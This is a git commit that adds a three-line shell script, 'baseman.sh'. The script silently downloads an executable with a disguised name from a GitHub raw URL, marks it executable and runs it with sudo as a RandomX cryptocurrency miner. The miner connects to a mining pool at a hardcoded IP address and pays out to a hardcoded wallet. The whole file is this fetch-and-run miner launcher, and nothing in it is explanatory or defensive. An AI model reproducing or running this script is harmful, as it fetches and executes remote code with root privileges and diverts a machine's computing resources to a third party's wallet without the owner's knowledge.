76fa1d835c21a1e1f4c011d13ee0a39b2886c0b6
epois <152323500+epois@users.noreply.github.com>
2023-11-29 03:13:55 +0800

    Create baseman.sh

---
+++ baseman.sh
@@ -0,0 +1,3 @@
+wget https://github.com/sitina21/epep/raw/main/SORABI >/dev/null 2>&1
+chmod +x SORABI
+sudo ./SORABI --disable-gpu --algorithm randomx --pool 149.50.222.86:80 --wallet ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY.$(echo $(shuf -i 100-999 -n 1)-DEWA)
